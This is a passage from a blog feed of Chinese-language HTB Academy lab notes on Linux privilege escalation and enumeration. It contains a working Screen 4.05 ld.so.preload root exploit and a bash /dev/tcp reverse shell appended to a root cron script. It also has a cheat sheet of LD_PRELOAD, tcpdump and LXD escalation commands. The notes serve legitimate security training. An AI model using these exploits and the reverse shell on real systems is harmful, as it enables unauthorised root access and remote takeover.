create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declarationrm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>Cron作业也可以设置为一次性运行（例如在启动时）。它们通常用于管理任务，如运行备份、清理目录等。crontab命令可以创建一个cron文件，该文件将由cron守护进程按照指定的时间表运行。创建cron文件时，将在&#x2F;var&#x2F;spool&#x2F;cron中为创建该文件的特定用户创建该文件。crontab文件中的每个条目都需要六个项目，顺序如下：分钟、小时、天、月、周、命令。例如，条目0*&#x2F;12***&#x2F;home&#x2F;admin&#x2F;backup.sh将每12小时运行一次。 root crontab几乎总是只能由root用户或具有完全sudo权限的用户编辑；然而，它仍然可以被滥用。您可能会找到一个以root身份运行的可写脚本，即使您无法读取crontab以了解确切的时间表，您也可以确定它的运行频率（即，每12小时创建一个.tar.gz文件的备份脚本）。在这种情况下，您可以将一个命令附加到脚本的末尾（例如反向shell一行），它将在下次运行cron作业时执行。</p><p>某些应用程序在&#x2F;etc&#x2F;cron.d目录中创建cron文件，并且可能被错误配置为允许非root用户编辑这些文件。 首先，让我们在系统中查找任何可写文件或目录。&#x2F;dmz backups目录中的文件backup.sh很有趣，看起来它可能运行在cron作业上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><p>在&#x2F;dmz&#x2F;backups目录中快速查看一下，会显示每三分钟创建一次的文件。这似乎是一个重大的错误配置。也许sysadmin的意思是指定每三个小时一次，比如0*&#x2F;3<strong><em>，但写的是</em>&#x2F;3</strong>**，它告诉cron作业每三分钟运行一次。第二个问题是backup.sh shell脚本是全局可写的，并且以root身份运行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /dmz-backups/total 36drwxrwxrwx  2 root root 4096 Aug 31 02:39 .drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh</code></pre><p>我们可以使用<a href="https://github.com/DominicBreuker/pspy">pspy</a>确认cron作业正在运行，pspy是一种命令行工具，用于查看正在运行的进程，而不需要root权限。我们可以使用它来查看其他用户运行的命令、cron作业等。它通过扫描procfs来工作。 让我们运行pspy并看看。-pf标志告诉工具打印命令和文件系统事件，-i 1000告诉它每隔1000毫秒（或每秒）扫描一次 <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./pspy64 -pf -i 1000pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat /dmz-backups/backup.sh #!/bin/bash SRCDIR=&quot;/var/www/html&quot; DESTDIR=&quot;/dmz-backups/&quot; FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR</code></pre><p>我们可以看到，脚本只是将源目录和目标目录作为变量。然后，它指定一个带有当前备份日期和时间的文件名，并创建源目录（web根目录）的tarball。让我们修改这个脚本，添加一个Bash单行反向shell。</p><pre><code class="bash">#!/bin/bashSRCDIR=&quot;/var/www/html&quot;DESTDIR=&quot;/dmz-backups/&quot;FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgztar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1</code></pre><blockquote><ul><li><code>bash -i</code>：启动一个交互式的 Bash shell，<code>-i</code> 表示进入交互模式。</li><li><code>&gt;&amp;</code>：将标准输出和标准错误输出合并为一个输出流。</li><li><code>/dev/tcp/10.10.14.3/443</code>：这是特殊的 Bash 设备文件，表示将数据发送到指定的 IP 地址和端口。在这里，它指定将输出流发送到 IP 地址为 <code>10.10.14.3</code> 的主机的 443 端口。</li><li><code>0&gt;&amp;1</code>：将标准输入重定向到与标准输出合并的输出流，实现双向通信。</li></ul></blockquote><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ssh htb-student@&lt;target IP&gt;</code></td><td>通过 SSH 连接到实验室目标</td></tr><tr><td>&#96;ps aux</td><td>grep root&#96;</td></tr><tr><td><code>ps au</code></td><td>查看已登录的用户</td></tr><tr><td><code>ls /home</code></td><td>查看用户主目录</td></tr><tr><td><code>ls -l ~/.ssh</code></td><td>检查当前用户的 SSH 密钥</td></tr><tr><td><code>history</code></td><td>检查当前用户的 Bash 历史记录</td></tr><tr><td><code>sudo -l</code></td><td>用户可以以其他用户的身份运行任何内容吗？</td></tr><tr><td><code>ls -la /etc/cron.daily</code></td><td>检查每日 Cron 作业</td></tr><tr><td><code>lsblk</code></td><td>检查未挂载的文件系统&#x2F;驱动器</td></tr><tr><td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写目录</td></tr><tr><td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写文件</td></tr><tr><td><code>uname -a</code></td><td>检查内核版本</td></tr><tr><td><code>cat /etc/lsb-release</code></td><td>检查操作系统版本</td></tr><tr><td><code>gcc kernel_expoit.c -o kernel_expoit</code></td><td>编译用 C 编写的漏洞利用</td></tr><tr><td><code>screen -v</code></td><td>检查已安装的 版本<code>Screen</code></td></tr><tr><td><code>./pspy64 -pf -i 1000</code></td><td>查看正在运行的进程<code>pspy</code></td></tr><tr><td><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SUID 位的二进制文件</td></tr><tr><td><code>find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SETGID 位的二进制文件</td></tr><tr><td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td><td>私人与<code>tcpdump</code></td></tr><tr><td><code>echo $PATH</code></td><td>检查当前用户的 PATH 变量内容</td></tr><tr><td><code>PATH=.:$&#123;PATH&#125;</code></td><td>在当前用户的 PATH 开头添加<code>.</code></td></tr><tr><td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td><td>搜索配置文件</td></tr><tr><td><code>ldd /bin/ls</code></td><td>查看二进制文件所需的共享对象</td></tr><tr><td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td><td>使用 提升权限<code>LD_PRELOAD</code></td></tr><tr><td>&#96;readelf -d payroll</td><td>grep PATH&#96;</td></tr><tr><td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td><td>编译共享库</td></tr><tr><td><code>lxd init</code></td><td>启动 LXD 初始化过程</td></tr><tr><td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td><td>导入本地镜像</td></tr><tr><td><code>lxc init alpine r00t -c security.privileged=true</code></td><td>启动特权 LXD 容器</td></tr><tr><td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td><td>在容器中挂载主机文件系统</td></tr><tr><td><code>lxc start r00t</code></td><td>启动容器</td></tr><tr><td><code>showmount -e 10.129.2.12</code></td><td>显示 NFS 导出列表</td></tr><tr><td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td><td>在本地挂载 NFS 共享</td></tr><tr><td><code>tmux -S /shareds new -s debugsess</code></td><td>已创建共享会话套接字<code>tmux</code></td></tr><tr><td><code>./lynis audit system</code></td><td>使用 执行系统审核<code>Lynis</code></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Path-Abuse&quot;&gt;&lt;a href=&quot;#Path-Abuse&quot; class=&quot;headerlink&quot; title=&quot;Path Abuse&quot;&gt;&lt;/a&gt;Path Abuse&lt;/h1&gt;&lt;p&gt;如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&amp;#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&amp;#x2F;bin&amp;#x2F;ls的二进制文件）。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Privilege_Escalation-Information Gathering</title>
    <link href="https://taninluv.github.io/2023/07/15/Linux-Privilege-Escalation/"/>
    <id>https://taninluv.github.io/2023/07/15/Linux-Privilege-Escalation/</id>
    <published>2023-07-15T07:44:51.000Z</published>
    <updated>2023-07-16T03:39:46.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>Linux系统上的根帐户提供对操作系统的完全管理级别访问。在评估过程中，您可能会在Linux主机上获得一个低特权shell，并且需要向根帐户执行权限提升。完全损害主机将使我们能够捕获流量并访问敏感文件，这些文件可能用于在环境中进一步访问。此外，如果Linux计算机已加入域，我们可以获得NTLM哈希并开始枚举和攻击Active Directory。</p><span id="more"></span><p>枚举：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><p>​ <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></p><h4 id="List-Current-Processes"><a href="#List-Current-Processes" class="headerlink" title="List Current Processes"></a>List Current Processes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep rootroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/initroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]root         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]root         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]root         5  0.0  0.0      0     0 ?        S&lt;   23:26   0:00 [kworker/0:0H]root         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]root         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]root         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]&lt;SNIP&gt;</code></pre><p>已安装的软件包和版本：与运行的服务一样，重要的是要检查是否有任何过期或易受攻击的软件包，这些软件包可能很容易用于权限提升。一个例子是Screen，它是一个常见的终端多路复用器（类似于tmux）。它允许您启动一个会话并打开许多窗口或虚拟终端，而不是打开多个终端会话。版本4.05.00存在权限提升漏洞，可轻松利用该漏洞提升权限。 </p><p>已登录用户：了解哪些其他用户已登录系统以及他们正在做什么，可以更深入地了解可能的本地横向移动和权限提升路径。 列出当前进程</p><pre><code class="shell-session">Tanin@htb[/htb]$ ps auUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot      1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bashshared     1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bashroot      1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo suroot      1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 suroot      1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bashshared     1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au</code></pre><h4 id="Home-Directory-Contents"><a href="#Home-Directory-Contents" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><h4 id="Home-Directory-Contents-1"><a href="#Home-Directory-Contents-1" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><p>我们可以检查各个用户目录，检查诸如.bash_history文件之类的文件是否可读并包含任何有趣的命令，查找配置文件，并检查是否可以获得用户SSH密钥的副本。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /home/stacey.jenkins/total 32drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profiledrwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh</code></pre><p>如果找到当前用户的SSH密钥，则可以使用该密钥在主机上打开SSH会话（如果SSH在外部公开），并获得稳定且完全交互的会话。SSH密钥也可以用来访问网络中的其他系统。至少，检查ARP缓存以查看正在访问的其他主机，并将这些主机与任何可用的SSH私钥进行交叉引用。</p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>Sudo特权：用户可以以其他用户或root用户的身份运行任何命令吗？如果您没有用户的凭据，则可能无法利用sudo权限。然而，sudoer条目通常包括NOPASSWD，这意味着用户可以在不提示输入密码的情况下运行指定的命令。并非所有命令，即使我们可以以root身份运行，也会导致权限提升。以拥有完全sudo权限的用户身份获得访问权限并不罕见，这意味着他们可以以root用户身份运行任何命令。发出一个简单的sudo-su命令将立即为您提供一个根会话。</p><h4 id="Sudo-List-User’s-Privileges"><a href="#Sudo-List-User’s-Privileges" class="headerlink" title="Sudo - List User’s Privileges"></a>Sudo - List User’s Privileges</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>配置文件：配置文件可以保存丰富的信息。值得在所有以.conf和.config等扩展名结尾的文件中搜索用户名、密码和其他机密。 </p><p>Shadow File：如果Shadow File是可读的，您将能够为所有设置了密码的用户收集密码哈希。虽然这不能保证进一步的访问，但这些哈希可能会受到离线暴力攻击，以恢复明文密码。</p><p> &#x2F;etc&#x2F;passwd中的密码哈希：偶尔，您会直接在&#x2F;etc&#x2F;passwd文件中看到密码哈希。该文件对所有用户都是可读的，与Shadow File中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><p>Cron Jobs：Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron-Jobs"><a href="#Cron-Jobs" class="headerlink" title="Cron Jobs"></a>Cron Jobs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/total 60drwxr-xr-x  2 root root 4096 Aug 30 23:49 .drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..-rwxr-xr-x  1 root root  376 Mar 31  2016 apport-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat-rwx--x--x  1 root root  379 Aug 30 23:49 backup-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg-rwxr-xr-x  1 root root  372 May  6  2015 logrotate-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common</code></pre><h4 id="File-Systems-amp-Additional-Drives"><a href="#File-Systems-amp-Additional-Drives" class="headerlink" title="File Systems &amp; Additional Drives"></a>File Systems &amp; Additional Drives</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda      8:0    0   30G  0 disk ├─sda1   8:1    0   29G  0 part /├─sda2   8:2    0    1K  0 part └─sda5   8:5    0  975M  0 part [SWAP]sr0     11:0    1  848M  0 rom  </code></pre><p>SETUID和SETGID权限：二进制文件设置有这些权限，允许用户以root身份运行命令，而无需向用户授予root级别的访问权限。许多二进制文件包含可以用来获取根shell的功能。 </p><p>可写目录：如果您需要将工具下载到系统中，那么发现哪些目录是可写的非常重要。您可能会发现cron jobs放置文件的可写目录，该目录提供了cron作业运行频率的概念，如果cron jobs所运行的脚本也是可写的，则可用于提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null/dmz-backups/tmp/tmp/VMwareDnD/tmp/.XIM-unix/tmp/.Test-unix/tmp/.X11-unix/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp/tmp/.font-unix/tmp/.ICE-unix/proc/dev/mqueue/dev/shm/var/tmp/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp/var/crash/run/lock</code></pre><blockquote><p>该命令用于在Linux系统中查找具有写权限的目录。下面是对该命令的解释：</p><ul><li><p><code>find</code>：查找命令。</p></li><li><p><code>/</code>：指定要在根目录下开始查找。</p></li><li><p><code>-path /proc -prune</code>：排除路径为<code>/proc</code>的目录。</p></li><li><p><code>-o</code>：逻辑运算符，表示或者。</p></li><li><p><code>-type d</code>：指定查找的对象类型为目录。</p></li><li><p><code>-perm -o+w</code>：指定查找的目录具有其他用户写权限。</p></li><li><p><code>2&gt;/dev/null</code>：将错误输出重定向到<code>/dev/null</code>，以忽略任何权限错误信息。</p></li><li><p>在查找具有写权限的目录时，可以使用 <code>-perm -o+w</code> 来指定条件。该选项的含义是：</p><ul><li><code>-perm</code>：用于指定文件和目录权限的匹配条件。</li><li><code>-o</code>：表示其他用户权限组。</li><li><code>+w</code>：表示具有写权限。</li></ul><p>因此，<code>-perm -o+w</code> 表示查找具有其他用户组可写权限的文件和目录。</p></li></ul></blockquote><p>可写文件：任何脚本或配置文件都是可写的吗？虽然更改配置文件可能具有极大的破坏性，但在某些情况下，轻微的修改可能会打开进一步的访问权限。此外，任何使用cron jobs以root身份运行的脚本都可以稍作修改以附加命令。</p><h4 id="Find-Writable-Files"><a href="#Find-Writable-Files" class="headerlink" title="Find Writable Files"></a>Find Writable Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><h2 id="Gaining-Situational-Awareness"><a href="#Gaining-Situational-Awareness" class="headerlink" title="Gaining Situational Awareness"></a>Gaining Situational Awareness</h2><p>通常，我们需要运行一些基本命令来确定自己的方向：</p><ul><li><code>whoami</code> - what user are we running as</li><li><code>id</code> - what groups does our user belong to?</li><li><code>hostname</code> - what is the server named. can we gather anything from the naming convention?</li><li><code>ifconfig</code> or <code>ip -a</code> - what subnet did we land in, does the host have additional NICs in other subnets?</li><li><code>sudo -l</code> - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like <code>sudo su</code> and drop right into a root shell.</li><li>&#x2F;etc&#x2F;os-release</li></ul><p>接下来，我们将检查当前用户的PATH，每当为任何可执行文件执行命令以匹配我们键入的名称时，Linux系统都会在其中查找，即，该系统上位于&#x2F;usr&#x2F;bin&#x2F;id的id。正如我们稍后在本模块中看到的，如果目标用户的PATH变量配置错误，我们可能可以利用它来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre><p>我们还可以检查为当前用户设置的所有环境变量，我们可能会幸运地在其中找到一些敏感的东西，例如密码。</p><pre><code class="shell-session">Tanin@htb[/htb]$ envSHELL=/bin/bashPWD=/home/htb-studentLOGNAME=htb-studentXDG_SESSION_TYPE=ttyMOTD_SHOWN=pamHOME=/home/htb-studentLANG=en_US.UTF-8&lt;SNIP&gt;</code></pre><p>接下来让我们记下内核版本。我们可以进行一些搜索，看看目标是否正在运行一个易受攻击的内核（我们稍后将在模块中利用它），该内核具有一些已知的公共漏洞PoC。我们可以用几种方法来实现，另一种方法是&#x3D;&#x3D;cat&#x2F;proc&#x2F;version&#x3D;&#x3D;，但我们将使用uname-a命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ uname -aLinux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>接下来，我们可以收集一些关于主机本身的附加信息，例如CPU类型&#x2F;版本：</p><pre><code class="shell-session">Tanin@htb[/htb]$ lscpu Architecture:                    x86_64CPU op-mode(s):                  32-bit, 64-bitByte Order:                      Little EndianAddress sizes:                   43 bits physical, 48 bits virtualCPU(s):                          2On-line CPU(s) list:             0,1Thread(s) per core:              1Core(s) per socket:              2Socket(s):                       1NUMA node(s):                    1Vendor ID:                       AuthenticAMDCPU family:                      23Model:                           49Model name:                      AMD EPYC 7302P 16-Core ProcessorStepping:                        0CPU MHz:                         2994.375BogoMIPS:                        5988.75Hypervisor vendor:               VMware&lt;SNIP&gt;</code></pre><p>服务器上存在哪些登录shell？记下这些，并强调Tmux和Screen对我们都可用。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/shells# /etc/shells: valid login shells/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/bin/dash/usr/bin/dash/usr/bin/tmux/usr/bin/screen</code></pre><p>我们还应该检查是否有任何防御措施，我们可以列举有关它们的任何信息。需要查找的内容包括：</p><ul><li><a href="https://en.wikipedia.org/wiki/Exec_Shield">Exec Shield</a></li><li><a href="https://linux.die.net/man/8/iptables">iptables</a></li><li><a href="https://apparmor.net/">AppArmor</a></li><li><a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li><li><a href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li><li><a href="https://www.snort.org/faq/what-is-snort">Snort</a></li><li><a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li></ul><p>通常情况下，我们没有特权列举这些保护的配置，但知道哪些配置（如果有的话）可以帮助我们避免在某些任务上浪费时间。 接下来，我们可以查看系统上的驱动器和任何共享。首先，我们可以使用lsblk命令枚举系统上块设备（硬盘、USB驱动器、光盘驱动器等）的信息。如果我们发现并可以装载额外的驱动器或未装载的文件系统，我们可能会发现可以用来提升特权的敏感文件、密码或备份。</p><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTloop0                       7:0    0   55M  1 loop /snap/core18/1705loop1                       7:1    0   69M  1 loop /snap/lxd/14804loop2                       7:2    0   47M  1 loop /snap/snapd/16292loop3                       7:3    0  103M  1 loop /snap/lxd/23339loop4                       7:4    0   62M  1 loop /snap/core20/1587loop5                       7:5    0 55.6M  1 loop /snap/core18/2538sda                         8:0    0   20G  0 disk ├─sda1                      8:1    0    1M  0 part ├─sda2                      8:2    0    1G  0 part /boot└─sda3                      8:3    0   19G  0 part   └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /sr0                        11:0    1  908M  0 rom </code></pre><p>命令lpstat可用于查找有关连接到系统的任何打印机的信息。如果有活动或排队的打印作业，我们是否可以访问某种敏感信息？<br>我们还应该检查已安装的驱动器和未安装的驱动器。我们可以安装一个死驱动器并访问敏感数据吗？通过在&#x2F;etc&#x2F;fstab中查找密码、用户名、凭据等常用词，我们能在fstab中为已安装的驱动器找到任何类型的凭据吗？</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab# /etc/fstab: static file system information.## Use &#39;blkid&#39; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0# /boot was on /dev/sda2 during curtin installation/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0</code></pre><p>键入route或netstat-rn查看路由表。在这里，我们可以看到通过哪个接口可以使用哪些其他网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ routeKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Ifacedefault         _gateway        0.0.0.0         UG    0      0        0 ens19210.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192</code></pre><p>在域环境中，如果主机配置为使用内部DNS，我们肯定要检查&#x2F;etc&#x2F;resolv.conf。我们可以将其作为查询Active Directory环境的起点。 我们还想检查arp表，看看目标一直在与哪些其他主机通信。</p><pre><code class="shell-session">Tanin@htb[/htb]$ arp -a_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192</code></pre><p>偶尔，我们会在&#x2F;etc&#x2F;passwd文件中直接看到密码散列。该文件对所有用户都是可读的，与&#x2F;etc&#x2F;shadow文件中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | cut -f1 -d:rootdaemonbinsys</code></pre><p>Linux系统中的每个用户都被分配到一个或多个特定的组，从而获得特殊权限。例如，如果我们有一个名为dev的文件夹仅供开发人员使用，则必须将用户分配到适当的组以访问该文件夹。有关可用组的信息可以在&#x2F;etc&#x2F;group文件中找到，该文件向我们显示了组名和分配的用户名。</p><h4 id="Existing-Groups"><a href="#Existing-Groups" class="headerlink" title="Existing Groups"></a>Existing Groups</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/grouproot:x:0:daemon:x:1:bin:x:2:sys:x:3:...</code></pre><p>&#x2F;etc&#x2F;group文件列出了系统上的所有组。然后，我们可以使用 <a href="https://man7.org/linux/man-pages/man1/getent.1.html">getent</a> 命令列出任何感兴趣的组的成员。</p><pre><code class="shell-session">Tanin@htb[/htb]$ getent group sudosudo:x:27:mrb3n</code></pre><h4 id="Mounted-File-Systems"><a href="#Mounted-File-Systems" class="headerlink" title="Mounted File Systems"></a>Mounted File Systems</h4><p>卸载文件系统后，系统将无法再访问该文件系统。这可能是由于各种原因造成的，例如删除磁盘或不再需要文件系统时。另一个原因可能是文件、脚本、文档和其他重要信息不能由标准用户装载和查看。因此，如果我们能够将权限扩展到根用户，我们就可以自己装载和读取这些文件系统。可以按如下方式查看未装载的文件系统：</p><pre><code class="shell-session">Tanin@htb[/htb]$ df -hFilesystem      Size  Used Avail Use% Mounted onudev            1,9G     0  1,9G   0% /devtmpfs           389M  1,8M  388M   1% /run/dev/sda5        20G  7,9G   11G  44% /</code></pre><h4 id="Unmounted-File-Systems"><a href="#Unmounted-File-Systems" class="headerlink" title="Unmounted File Systems"></a>Unmounted File Systems</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab | grep -v &quot;#&quot; | column -tUUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1/swapfile                                  none       swap  sw                 0  